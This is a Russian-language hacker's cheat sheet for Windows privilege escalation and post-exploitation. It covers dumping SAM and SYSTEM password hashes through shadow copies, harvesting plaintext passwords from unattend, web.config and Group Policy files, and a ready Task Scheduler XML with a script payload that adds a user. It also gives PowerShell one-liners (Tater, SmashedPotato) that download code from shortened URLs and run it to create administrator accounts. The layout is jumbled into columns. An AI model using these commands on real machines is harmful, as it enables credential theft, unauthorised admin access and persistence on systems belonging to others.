
        Windows
                Важненько, вот компиляция сплоитов под винду на лине, тулза mingw‐w64 (i686‐w64‐mingw32‐gcc 40564.c –o exploit.exe –lws2_32)
        
        
             Есть нулевые сессии для винды, и вот одно из прог (exe) которая даст инфу (http://ntsecurity.nu/toolbox/winfo/), о пользователях
             TransportEnum-тулза узнаёт через реестр винды какие она поддерживает сетевые интерфейсы
             В стандартном арсенале винды есть команда net view, сканирует сеть
             Так же встроенные аккаунты с админом (RID 500) и юзером (RID 501), вот софт для этого, так же exe (http://ntsecurity.nu/toolbox/dumpusers/)
             Дамп хешей, можно юзать утилиту pwdump, но с хорошими правами, команда (pwdump localhost), так же её можно натравлять на машины в локалке
             Приведу список действй для дампа хешей с помощью теневого дампа SAM и SYSTEM Для начала запускаем сервис теневого копирования: cscript vssown.vbs /start. Затем создаем новую теневую копию: cscript vssown.vbs /create. Теперь смотрим список всех теневых копий: cscript vssown.vbs /list.

             Созданная нами копия будет самой последней. Из всей информации нас интересует Device object со значением «\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14» (здесь 14 — номер теневой копии). Дальнейшие манипуляции предельно просты.
             Копируем интересующие нас файлы:copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\ windows\system32\config\SYSTEM . copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\ windows\system32\config\SAM .
             Все, теперь эти файлы можно скормить какой-нибудь утилите типа SAMInside для расшифровки полученных хешей.
             Если ты в AD то есть возможность сдампить всех пользователей домена с помощью копирование и расфишровки, как именно хз
             
             При использовании автоматической установки софта (unattended installation) в системе можно обнаружить вот такие файлы (post/windows/gather/enum_unattend) (    C:\unattend.xml
                                                                                                                                                                            C:\Windows\Panther\Unattend.xml
              Если на машине установлен IIS, то нелишним будет проверить файлы                                                                                              C:\Windows\Panther\Unattend\Unattend.xml
                 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config                                                                                          C:\Windows\system32\sysprep.inf
                 C:\inetpub\wwwroot\web.config                                                                                                                              C:\Windows\system32\sysprep\sysprep.xml      )
                        в которых также может присутствовать пароль администратора в plaintext.                                                                          

                                                                                                                                                          
            Пароли групповой политики в случае локальной машины проверяем наличие файла по следующему пути:
                        C:\ProgramData\Microsoft\Group Policy\History\*\Machine\Preferences\Groups\Groups.xml                                                                                                                                             
                  Для контрол лера домена:
                           \\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
             Он зашифрован, расшифровать можно Metasploit (post/windows/gather/creden‐tials/gpp)

            Планировщик задач можеть дать тебе админа, для этого нужно создать XML и запихнуть его в планировщик задач, только поменяй путь к пейлоаду и юзера в UserId         
                                                                                             Готовый файл:
                                                                                <?xml version="1.0" encoding="UTF‐16"?>
                                                                                <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/
                                                                                02/mit/task">
                                                                                <RegistrationInfo>
                                                                                    <Date>1337‐01‐01T13:37:07.9601296</Date>
                                                                                    <Author>NT AUTHORITY\SYSTEM</Author>
                                                                                </RegistrationInfo>
                                                                                <Triggers />
                                                                                <Principals>
                                                                                    <Principal id="Author">
                                                                                      <UserId>PCNAME\USERNAME</UserId>
                                                                                      <LogonType>S4U</LogonType>
                                                                                      <RunLevel>HighestAvailable</RunLevel>
                                                                                    </Principal>
                                                                                </Principals>
                                                                                <Settings>
                                                                                    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                                                                                    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
                                                                                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                                                                                    <AllowHardTerminate>true</AllowHardTerminate>
                                                                                    <StartWhenAvailable>true</StartWhenAvailable>
                                                                                    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
                                                                                    <IdleSettings>
                                                                                      <StopOnIdleEnd>true</StopOnIdleEnd>
                                                                                      <RestartOnIdle>false</RestartOnIdle>
                                                                                    </IdleSettings>
                                                                                    <AllowStartOnDemand>true</AllowStartOnDemand>
                                                                                    <Enabled>true</Enabled>
                                                                                    <Hidden>false</Hidden>
                                                                                    <RunOnlyIfIdle>false</RunOnlyIfIdle>
                                                                                    <WakeToRun>false</WakeToRun>
                                                                                    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
                                                                                    <Priority>7</Priority>
                                                                                    <RestartOnFailure>
                                                                                      <Interval>PT1M</Interval>
                                                                                      <Count>3</Count>
                                                                                    </RestartOnFailure>
                                                                                </Settings>
                                                                                <Actions Context="Author">
                                                                                    <Exec>
                                                                                      <Command>%USERPROFILE%\Desktop\EXPLOIT.JS</Command>
                                                                                    </Exec>
                                                                                </Actions>
                                                                                </Task>
                                                                                
                                                                                Вот полезная нагрузка: 
                                                                                        suidshell = WScript.CreateObject("WScript.Shell");
                                                                                        suidshell.run("cmd.exe /c net user TEST TESTPWD /add", 0);


                Тулза beroot используется для повышения привилегий (exe) (https://howucan.gr/scripts-tools/2049-beroot-windows-privilege-escalation-tool)
                Powershell скрипт для проверки патчей на дыры Sherlock (https://github.com/rasta-mouse/Sherlock) (import-module ./Sherlock.ps1)
                Вот еще один инструмент для PLE но это пообширнее, проверяет всё до чего может дотянуться (https://github.com/pentestmonkey/windows-privesc-check/) (windows-privesc-check2.exe --audit -a -o -report)
                SmashedPotato, тоже тулза для те же вещей, является адгрейдом классики Hot Potato (https://github.com/Cn33liz/SmashedPotato)  x64 ->             (powershell ‐ExecutionPolicy Bypass ‐noLogo ‐Command (new‐object
                         Но тут оговорочка, для 7 и нише всё шикорно, правда выше уже сложности, тут придется ждать максимум сутки, и работает он на .NET         System.Net.WebClient).DownloadFile('http://is.gd/y6cfKV','%temp%\
                                                                                                                                                                  SmashedPotato.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* &
                                                                                                                                                                  & csc.exe /out:"%temp%\SmashedPotatoX64.exe" /platform:x64 "%temp%\
                                                                                                                                                                  SmashedPotato.cs" && InstallUtil.exe /logfile= /LogToConsole=false /U
                                                                                                                                                                  %temp%\SmashedPotatoX64.exe  )
                
               Tater, тот же Картошка, но на Powershell (https://github.com/Kevin-Robertson/Tater) (  powershell "IEX (New‐Object Net.WebClient).DownloadString('http://is.
                                                                                                      gd/fVC1Yd'); Invoke‐Tater ‐Trigger 1 ‐Command ""net user User1 Passwo
                                                                                                      rd1 /add && net localgroup administrators User1 /add""" )
                       После чего в системе появит ся пользователь User1 с паролем Password1 ,входящий в группу  администраторов. Но надо отметить, что для Windows 10 следует использовать ключ ‐Trigger 2 
                                                                                                               
                
                
               С локального админа до системы-изи с EasySystem (https://github.com/Cn33liz/EasySystem) просто exe-шник, запустил и система, работает по имперсонации
               Еще способ, тут нужно смотреть на версию (начиная с висты и заканчивая сервер 2012), нужен Powershell 2.0 и выше, и 2 или более CPU ядер, вот модуль метасплоита (exploit/windows/local/ms16_032_secondary_logon_handle_‐privesc) 
                           И стоит чекнуть стоит ли патч (C:\Users\pentestlab> wmic qfe list | find "3139914")                                                                                                                                         так же Powershell (https://www.exploit-db.com/exploits/39719/)
                                                                                                                                                                    и exe-шник (https://github.com/khr0x40sh/ms16-032)
             

